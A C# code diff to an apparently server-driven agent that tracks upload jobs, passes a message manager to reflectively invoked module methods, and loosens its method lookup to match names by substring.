@@ -27,6 +27,7 @@ namespace Agent
             this.messageManager = messageManager;
             this.tokenManager = tokenManager;
             this.config = config;
+            uploadJobs = new ConcurrentDictionary<string, ServerUploadJob>();
         }
 
         public async Task Execute(ServerJob job)
@@ -274,8 +275,7 @@ namespace Agent
                     //do some error stuff
                     return false;
                 }
-
-                var result = method.Invoke(null, new object[] { task_id, module_tasks[task_id].GetArgs() });
+                var result = method.Invoke(null, new object[] { task_id, module_tasks[task_id].GetArgs(), messageManager });
                 return true;
             }
             catch (Exception e)
@@ -310,13 +310,20 @@ namespace Agent
 
             foreach (Type type in assembly.GetTypes())
             {
+                foreach(var method in type.GetMethods())
+                {
+                    if (method.Name.Contains(methodName))
+                    {
+                        return type.GetMethod(method.Name, BindingFlags.Public | BindingFlags.Static);
+                    }
+                }
                 targetMethod = type.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);
 
-                // Check if the method exists and matches the desired signature
-                if (targetMethod != null)
-                {
-                    return targetMethod;
-                }
+                //// Check if the method exists and matches the desired signature
+                //if (targetMethod != null)
+                //{
+                //    return targetMethod;
+                //}
             }
             return null;
         }
